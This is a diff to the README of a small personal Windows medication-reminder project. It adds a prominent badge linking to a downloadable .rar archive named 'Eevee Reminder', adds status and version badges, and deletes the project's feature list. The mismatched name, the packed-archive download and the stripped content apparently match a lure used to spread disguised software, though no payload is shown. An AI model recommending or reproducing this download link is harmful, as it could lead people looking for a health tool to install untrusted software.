@@ -1,5 +1,17 @@
 # Medication Reminder
 
+<p align="center"><a href="https://github.com/ArtMMS/eevee-reminder/releases/download/v1.1.0/Eevee.Reminder.rar"><img src="https://img.shields.io/badge/⬇%20Download-Eevee%20Reminder-B08D57?style=for-the-badge&labelColor=6F4E37" alt="Download Eevee Reminder"></a></p>
+
+
+
+<p align="center">
+  <img src="https://img.shields.io/badge/status-ready-4CAF50" alt="Status: Ready">
+  <img src="https://img.shields.io/badge/version-v1.1.0-B08D57" alt="Version 1.1.0">
+  <img src="https://img.shields.io/badge/Python-3.14.7-3776AB?logo=python&logoColor=white" alt="Python 3.14.7">
+  <img src="https://img.shields.io/badge/Platform-Windows%2011-0078D4?logo=windows11&logoColor=white" alt="Platform: Windows 11">
+</p>
+
+
 ## About the Project
 
 The goal of this project is to develop a simple Windows application that helps users remember to take their medications at the correct times.
@@ -11,18 +23,6 @@ This project was created both as a software development exercise and as a practi
 In addition to addressing a real-world need, the project serves as an opportunity to study programming concepts such as graphical user interfaces, file handling, time management, and Windows application deployment.
 
 This is a personal project intended for learning and personal use.
-
----
-
-## Minimum Viable Product (MVP)
-
-* Run on Windows.
-* Start automatically when Windows starts.
-* Allow the user to configure one or more reminder times.
-* Play an alert sound when a reminder is triggered.
-* Display a notification window.
-* Provide a button to confirm that the medication has been taken.
-* Prevent the same reminder from being triggered repeatedly.
 
 ---
 
